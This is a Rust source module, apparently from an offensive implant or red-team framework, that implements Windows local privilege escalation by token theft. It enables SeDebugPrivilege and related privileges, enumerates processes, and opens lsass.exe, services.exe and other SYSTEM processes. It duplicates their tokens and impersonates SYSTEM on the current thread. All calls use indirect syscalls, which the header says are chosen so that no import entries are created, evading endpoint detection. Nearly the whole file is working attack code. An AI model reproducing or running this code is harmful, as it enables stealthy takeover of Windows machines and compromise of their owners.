//! Token impersonation / theft LPE technique.
//!
//! Enumerates running processes via `NtQuerySystemInformation`, opens their
//! tokens via indirect syscalls (`NtOpenProcessToken`), and duplicates them
//! into impersonation tokens.  Targets SYSTEM-owned processes (wininit.exe,
//! services.exe, lsass.exe, svchost.exe with specific service groups).
//!
//! Before attempting token theft, the module tries to enable useful
//! privileges (SeDebugPrivilege, SeImpersonatePrivilege, SeAssignPrimaryToken)
//! on the *current* process token via `NtAdjustPrivilegesToken`.
//!
//! All NT API calls go through the existing indirect syscall layer — no IAT
//! entries are created.

use crate::win_types::HANDLE;
use anyhow::{anyhow, Context, Result};
use windows_sys::Win32::Security::TokenImpersonation;
use windows_sys::Win32::Security::{
    SecurityImpersonation, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_QUERY,
};
// ── NTSTATUS helpers ───────────────────────────────────────────────────────

fn nt_success(status: i32) -> bool {
    status >= 0
}

fn nt_error(status: i32) -> bool {
    status < 0
}

// ── Privilege constants ────────────────────────────────────────────────────

/// SeDebugPrivilege LUID (well-known: 0x14).
const SE_DEBUG_PRIVILEGE_LUID: u64 = 0x14;
/// SeImpersonatePrivilege LUID (well-known: 0x1D).
const SE_IMPERSONATE_PRIVILEGE_LUID: u64 = 0x1D;
/// SeAssignPrimaryTokenPrivilege LUID (well-known: 0x13).
const SE_ASSIGN_PRIMARY_TOKEN_LUID: u64 = 0x13;

/// SE_PRIVILEGE_ENABLED attribute.
const SE_PRIVILEGE_ENABLED: u32 = 0x0000_0002;

/// TOKEN_ADJUST_PRIVILEGES access right.
const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;

// ── Token privilege structures (match winnt.h layout) ──────────────────────

#[repr(C)]
struct Luid {
    low_part: u32,
    high_part: i32,
}

#[repr(C)]
struct LuidAndAttributes {
    luid: Luid,
    attributes: u32,
}

#[repr(C)]
struct TokenPrivileges {
    privilege_count: u32,
    privileges: [LuidAndAttributes; 1],
}

// ── Process enumeration structures ─────────────────────────────────────────

/// SYSTEM_PROCESS_INFORMATION header (variable-size).
#[repr(C)]
struct SystemProcessInformation {
    next_entry_offset: u32,
    number_of_threads: u32,
    working_set_private_size: i64,
    cycle_count: u64,
    create_time: i64,
    user_time: i64,
    kernel_time: i64,
    image_name_length: u16,
    image_name_maximum_length: u16,
    image_name_buffer: *mut u16,
    base_priority: i32,
    unique_process_id: usize,
    inherited_from_unique_process_id: usize,
}

/// SystemProcessInformation info class for NtQuerySystemInformation.
const SYSTEM_PROCESS_INFORMATION: u32 = 5;

// ── Target processes that run as SYSTEM ────────────────────────────────────

/// Ordered list of candidate processes for SYSTEM token theft.
/// Earlier entries are preferred (more stable, less likely to be monitored).
const SYSTEM_TARGETS: &[&str] = &["wininit.exe", "services.exe", "lsass.exe", "svchost.exe"];

// ── Indirect syscall wrappers ──────────────────────────────────────────────

/// Close a kernel handle via `NtClose` indirect syscall.  Best-effort.
fn nt_close_handle(handle: u64) {
    if handle == 0 || handle == usize::MAX as u64 {
        return;
    }
    let _ = crate::syscall!("NtClose", handle);
}

/// Call `NtOpenProcess` via indirect syscall.
unsafe fn nt_open_process(pid: u32) -> Result<HANDLE> {
    use crate::win_types::OBJECT_ATTRIBUTES;
    use windows_sys::Win32::System::Threading::PROCESS_QUERY_LIMITED_INFORMATION;

    #[repr(C)]
    struct ClientId {
        unique_process: HANDLE,
        unique_thread: HANDLE,
    }

    let mut handle: HANDLE = std::ptr::null_mut();
    let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
    oa.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;

    let mut cid: ClientId = std::mem::zeroed();
    cid.unique_process = pid as usize as HANDLE;

    let target = crate::syscalls::get_syscall_id("NtOpenProcess")
        .map_err(|e| anyhow!("failed to resolve NtOpenProcess SSN: {e}"))?;
    let status = crate::syscalls::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            &mut handle as *mut _ as u64,
            PROCESS_QUERY_LIMITED_INFORMATION as u64,
            &mut oa as *mut _ as u64,
            &mut cid as *mut _ as u64,
        ],
    );

    if nt_error(status) {
        Err(anyhow!(
            "NtOpenProcess(PID {pid}) failed: NTSTATUS 0x{status:08X}"
        ))
    } else {
        Ok(handle)
    }
}

/// Call `NtOpenProcessToken` via indirect syscall.
unsafe fn nt_open_process_token(process: HANDLE, access: u32) -> Result<HANDLE> {
    let mut token: HANDLE = std::ptr::null_mut();
    let target = crate::syscalls::get_syscall_id("NtOpenProcessToken")
        .map_err(|e| anyhow!("failed to resolve NtOpenProcessToken SSN: {e}"))?;
    let status = crate::syscalls::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[process as u64, access as u64, &mut token as *mut _ as u64],
    );

    if nt_error(status) {
        Err(anyhow!(
            "NtOpenProcessToken failed: NTSTATUS 0x{status:08X}"
        ))
    } else {
        Ok(token)
    }
}

/// Call `NtDuplicateToken` via indirect syscall.
unsafe fn nt_duplicate_token(existing: HANDLE, access: u32, token_type: u32) -> Result<HANDLE> {
    use windows_sys::Win32::Security::SECURITY_QUALITY_OF_SERVICE;

    let mut new_token: HANDLE = std::ptr::null_mut();

    let mut sqos: SECURITY_QUALITY_OF_SERVICE = std::mem::zeroed();
    sqos.Length = std::mem::size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32;
    sqos.ImpersonationLevel = SecurityImpersonation as u32;
    sqos.ContextTrackingMode = 0;
    sqos.EffectiveOnly = 0;

    let target = crate::syscalls::get_syscall_id("NtDuplicateToken")
        .map_err(|e| anyhow!("failed to resolve NtDuplicateToken SSN: {e}"))?;
    let status = crate::syscalls::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            existing as u64,
            access as u64,
            &mut sqos as *mut _ as u64,
            0u64, // EffectiveOnly = FALSE
            token_type as u64,
            &mut new_token as *mut _ as u64,
        ],
    );

    if nt_error(status) {
        Err(anyhow!("NtDuplicateToken failed: NTSTATUS 0x{status:08X}"))
    } else {
        Ok(new_token)
    }
}

/// Call `NtQuerySystemInformation` via indirect syscall.
unsafe fn nt_query_system_information(
    info_class: u32,
    buffer: *mut u8,
    size: u32,
    return_length: *mut u32,
) -> i32 {
    let target = match crate::syscalls::get_syscall_id("NtQuerySystemInformation") {
        Ok(t) => t,
        Err(_) => return -1,
    };
    crate::syscalls::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            info_class as u64,
            buffer as u64,
            size as u64,
            return_length as u64,
        ],
    )
}

/// Call `NtAdjustPrivilegesToken` via indirect syscall.
///
/// Enables or disables privileges on a token.  Returns the raw NTSTATUS.
unsafe fn nt_adjust_privileges_token(
    token: HANDLE,
    disable_all: bool,
    new_state: *mut TokenPrivileges,
    buffer_length: u32,
    previous_state: *mut u8,
    return_length: *mut u32,
) -> i32 {
    let target = match crate::syscalls::get_syscall_id("NtAdjustPrivilegesToken") {
        Ok(t) => t,
        Err(e) => {
            tracing::error!(
                "lpe/token_impersonate: failed to resolve NtAdjustPrivilegesToken SSN: {e}"
            );
            return -1;
        }
    };
    crate::syscalls::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            token as u64,
            disable_all as u64,
            new_state as u64,
            buffer_length as u64,
            previous_state as u64,
            return_length as u64,
        ],
    )
}

/// Call `NtSetInformationThread(ThreadImpersonationToken)` via indirect syscall.
unsafe fn nt_set_thread_token(thread: HANDLE, token: HANDLE) -> i32 {
    let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
        Ok(t) => t,
        Err(e) => {
            tracing::error!(
                "lpe/token_impersonate: failed to resolve NtSetInformationThread SSN: {e}"
            );
            return -1;
        }
    };
    let token_value = token as u64;
    crate::syscalls::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            thread as u64,
            4u64, // ThreadImpersonationToken
            &token_value as *const u64 as u64,
            std::mem::size_of::<u64>() as u64,
        ],
    )
}

// ── Public API ─────────────────────────────────────────────────────────────

/// Check and enable useful privileges on the current process token.
///
/// Attempts to enable:
/// - `SeDebugPrivilege` — needed to open arbitrary process handles
/// - `SeImpersonatePrivilege` — needed for named pipe impersonation
/// - `SeAssignPrimaryTokenPrivilege` — needed for token assignment
///
/// Returns the list of privilege names that were successfully enabled.
/// Privileges that are not held by the current token are silently skipped
/// (the call returns `STATUS_NOT_ALL_ASSIGNED` which is a warning, not an error).
pub fn check_and_enable_privileges() -> Result<Vec<String>> {
    let mut enabled = Vec::new();

    // Open our own process token.
    let current_process: HANDLE = (-1isize) as HANDLE;
    let token =
        unsafe { nt_open_process_token(current_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY) }
            .context("failed to open own process token for privilege adjustment")?;

    let privileges_to_try: &[(&str, u64)] = &[
        ("SeDebugPrivilege", SE_DEBUG_PRIVILEGE_LUID),
        ("SeImpersonatePrivilege", SE_IMPERSONATE_PRIVILEGE_LUID),
        (
            "SeAssignPrimaryTokenPrivilege",
            SE_ASSIGN_PRIMARY_TOKEN_LUID,
        ),
    ];

    for (name, luid) in privileges_to_try {
        let mut tp: TokenPrivileges = TokenPrivileges {
            privilege_count: 1,
            privileges: [LuidAndAttributes {
                luid: Luid {
                    low_part: *luid as u32,
                    high_part: (*luid >> 32) as i32,
                },
                attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        let status = unsafe {
            nt_adjust_privileges_token(
                token,
                false, // DisableAllPrivileges = FALSE
                &mut tp as *mut _ as *mut TokenPrivileges,
                std::mem::size_of::<TokenPrivileges>() as u32,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            )
        };

        // STATUS_SUCCESS (0) or STATUS_NOT_ALL_ASSIGNED (0x00001003) are both OK.
        // STATUS_NOT_ALL_ASSIGNED means the privilege exists in the token but
        // not all requested privileges could be enabled (e.g., we only asked
        // for one, so it succeeded).
        if nt_success(status) {
            tracing::info!("lpe/token_impersonate: enabled {name}");
            enabled.push(name.to_string());
        } else {
            tracing::debug!(
                "lpe/token_impersonate: could not enable {name} (NTSTATUS 0x{status:08X})"
            );
        }
    }

    nt_close_handle(token as u64);

    if enabled.is_empty() {
        tracing::warn!("lpe/token_impersonate: no elevated privileges could be enabled");
    }

    Ok(enabled)
}

/// Find a SYSTEM token in accessible processes and duplicate it.
///
/// Strategy:
/// 1. Enumerate running processes via `NtQuerySystemInformation`
/// 2. For each candidate SYSTEM process, try to open its token
/// 3. Duplicate the token into an impersonation token
///
/// Returns the duplicated impersonation token `HANDLE` on success.
/// The caller is responsible for applying the token (via
/// `NtSetInformationThread`) and closing it when done.
pub fn exploit_token_impersonation() -> Result<HANDLE> {
    tracing::info!("lpe/token_impersonate: attempting SYSTEM token theft");

    // Try to enable SeDebugPrivilege first — helps with protected processes.
    let _ = check_and_enable_privileges();

    // Get our own PID so we don't try to steal our own token.
    #[repr(C)]
    struct Pbi {
        reserved1: *mut std::ffi::c_void,
        peb_base_address: *mut std::ffi::c_void,
        reserved2: [*mut std::ffi::c_void; 2],
        unique_process_id: usize,
        inherited_from_unique_process_id: usize,
    }
    let mut pbi: Pbi = unsafe { std::mem::zeroed() };
    let _ = crate::syscall!(
        "NtQueryInformationProcess",
        (-1isize) as u64, // NtCurrentProcess()
        0u64,             // ProcessBasicInformation
        &mut pbi as *mut _ as u64,
        std::mem::size_of::<Pbi>() as u64,
        std::ptr::null_mut::<u64>() as u64,
    );
    let my_pid = pbi.unique_process_id as u32;

    // Enumerate processes.
    let mut return_length: u32 = 0;
    let _status = unsafe {
        nt_query_system_information(
            SYSTEM_PROCESS_INFORMATION,
            std::ptr::null_mut(),
            0,
            &mut return_length,
        )
    };

    let buf_size = if return_length > 0 {
        return_length as usize + 0x1_0000
    } else {
        0x4_0000
    };

    let mut buffer = vec![0u8; buf_size];

    let status = unsafe {
        nt_query_system_information(
            SYSTEM_PROCESS_INFORMATION,
            buffer.as_mut_ptr(),
            buf_size as u32,
            &mut return_length,
        )
    };

    if !nt_success(status) {
        return Err(anyhow!(
            "NtQuerySystemInformation failed: NTSTATUS 0x{status:08X}"
        ));
    }

    // Walk the process list and try each SYSTEM target.
    let mut offset: usize = 0;
    loop {
        if offset + std::mem::size_of::<SystemProcessInformation>() > buffer.len() {
            break;
        }

        let entry = unsafe { &*(buffer.as_ptr().add(offset) as *const SystemProcessInformation) };
        let pid = entry.unique_process_id as u32;

        if pid != 0
            && pid != my_pid
            && entry.image_name_length > 0
            && !entry.image_name_buffer.is_null()
        {
            let name_len = entry.image_name_length as usize;
            // The name is embedded after the fixed header in the buffer.
            let name_start = offset + std::mem::size_of::<SystemProcessInformation>();
            let name_end = name_start + name_len;
            if name_end <= buffer.len() {
                let name_u16: Vec<u16> = (0..name_len / 2)
                    .map(|i| {
                        let off = name_start + i * 2;
                        u16::from_le_bytes([buffer[off], buffer[off + 1]])
                    })
                    .collect();
                let name_str = String::from_utf16_lossy(&name_u16);
                let filename = name_str
                    .rsplit('\\')
                    .next()
                    .unwrap_or(&name_str)
                    .to_lowercase();

                // Check if this is a target SYSTEM process.
                if SYSTEM_TARGETS.iter().any(|t| filename == *t) {
                    tracing::debug!("lpe/token_impersonate: trying {filename} (PID {pid})");

                    // Try to open the process and steal its token.
                    match steal_system_token(pid) {
                        Ok(token) => {
                            tracing::info!(
                                "lpe/token_impersonate: successfully stole SYSTEM token from {filename} (PID {pid})"
                            );
                            return Ok(token);
                        }
                        Err(e) => {
                            tracing::debug!(
                                "lpe/token_impersonate: failed to steal token from {filename} (PID {pid}): {e:#}"
                            );
                            // Continue trying other processes.
                        }
                    }
                }
            }
        }

        let next = entry.next_entry_offset as usize;
        if next == 0 {
            break;
        }
        offset += next;
    }

    Err(anyhow!(
        "lpe/token_impersonate: no SYSTEM token could be stolen from any target process"
    ))
}

/// Steal a token from a specific PID and return a duplicated impersonation token.
///
/// The caller owns the returned `HANDLE` and must close it via `NtClose`.
fn steal_system_token(pid: u32) -> Result<HANDLE> {
    let process = unsafe { nt_open_process(pid) }
        .with_context(|| format!("failed to open process PID {pid}"))?;

    let token = unsafe { nt_open_process_token(process, TOKEN_DUPLICATE | TOKEN_QUERY) }
        .with_context(|| format!("failed to open token for PID {pid}"))?;

    let dup_token =
        unsafe { nt_duplicate_token(token, TOKEN_ALL_ACCESS, TokenImpersonation as u32) }
            .context("failed to duplicate token")?;

    // Clean up intermediate handles.
    nt_close_handle(token as u64);
    nt_close_handle(process as u64);

    Ok(dup_token)
}

/// Apply an impersonation token to the current thread via
/// `NtSetInformationThread(ThreadImpersonationToken)`.
///
/// The caller should save the original token beforehand for restoration.
pub fn apply_impersonation_token(token: HANDLE) -> Result<()> {
    let current_thread: HANDLE = (-2isize) as HANDLE;
    let status = unsafe { nt_set_thread_token(current_thread, token) };
    if nt_error(status) {
        Err(anyhow!(
            "NtSetInformationThread(ThreadImpersonationToken) failed: NTSTATUS 0x{status:08X}"
        ))
    } else {
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn privilege_luid_constants() {
        // SeDebugPrivilege = 20 decimal
        assert_eq!(SE_DEBUG_PRIVILEGE_LUID, 0x14);
        // SeImpersonatePrivilege = 29 decimal
        assert_eq!(SE_IMPERSONATE_PRIVILEGE_LUID, 0x1D);
        // SeAssignPrimaryTokenPrivilege = 19 decimal
        assert_eq!(SE_ASSIGN_PRIMARY_TOKEN_LUID, 0x13);
    }

    #[test]
    fn se_privilege_enabled_value() {
        assert_eq!(SE_PRIVILEGE_ENABLED, 0x0000_0002);
    }

    #[test]
    fn token_adjust_privileges_flag() {
        assert_eq!(TOKEN_ADJUST_PRIVILEGES, 0x0020);
    }

    #[test]
    fn system_targets_include_key_processes() {
        assert!(SYSTEM_TARGETS.contains(&"wininit.exe"));
        assert!(SYSTEM_TARGETS.contains(&"services.exe"));
        assert!(SYSTEM_TARGETS.contains(&"lsass.exe"));
        assert!(SYSTEM_TARGETS.contains(&"svchost.exe"));
    }
}
